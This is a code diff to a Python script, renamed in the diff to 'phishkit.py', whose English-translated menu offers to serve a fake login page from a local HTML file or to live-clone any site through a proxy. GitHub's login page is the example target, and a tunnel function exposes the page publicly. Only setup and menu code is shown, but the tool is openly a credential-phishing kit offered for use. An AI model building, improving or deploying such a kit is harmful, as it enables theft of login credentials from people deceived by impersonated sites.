@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""logme.py v3 — server ab sach me chalega"""
+"""phishkit.py v3 — server ab sach me chalega"""
 import json, re, socket, subprocess, sys, threading, time, urllib.request, urllib.error
 from datetime import datetime
 from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
@@ -223,18 +223,18 @@ def start_tunnel(port):
 
 def main():
     print("""
-  logme.py v3 (FIXED) — server ab chalega
-  Mode 1: apni HTML file
-  Mode 2: kisi bhi site ka LIVE clone
+  Phishkit.py v3 (FIXED) — 
+  Mode 1: Local site File
+  Mode 2: Clone site Live
   Devloper: siddharth kabir kumar
   instagram: https://instagram.com/siddharth_kumarx
   github: https://github.com/siddharth46500/phishkit.git
 ------------------------------------------""")
-    ch = input("Mode: [1] apni HTML file   [2] kisi bhi site ka LIVE clone\n>>> ").strip()
+    ch = input("Mode: [1] Local site File   [2] Clone site live\n>>> ").strip()
     H.mode = "proxy" if ch == "2" else "file"
 
     if H.mode == "proxy":
-        target = input("Target URL (jaise https://github.com/login): ").strip()
+        target = input("Target URL (jaise https://github.com/login) [+] ").strip()
         if not target.lower().startswith("http"):
             target = "https://" + target
         print("[*] Test fetch ...")
@@ -242,13 +242,13 @@ def main():
             data, ctype, _ = http_get(target)
             print(f"[+] OK — {len(data)} bytes")
         except Exception as e:
-            print(f"[!] Target tak nahi pahunche: {e}")
+            print(f"[!] Did not reach the Target: {e}")
             sys.exit(1)
         H.target = target
     else:
         files = sorted(f.name for f in SITE_DIR.iterdir() if f.suffix.lower() in (".html", ".htm"))
         if not files:
-            sys.exit(f"[!] '{SITE_DIR}' folder khali hai — usme github.html jaisi file daalo")
+            sys.exit(f"[!] '{SITE_DIR}' folder is Empty - Please insert (Ex: github.html) File")
         print(f"[+] site/ me mili: {', '.join(files)}")
 
     try:
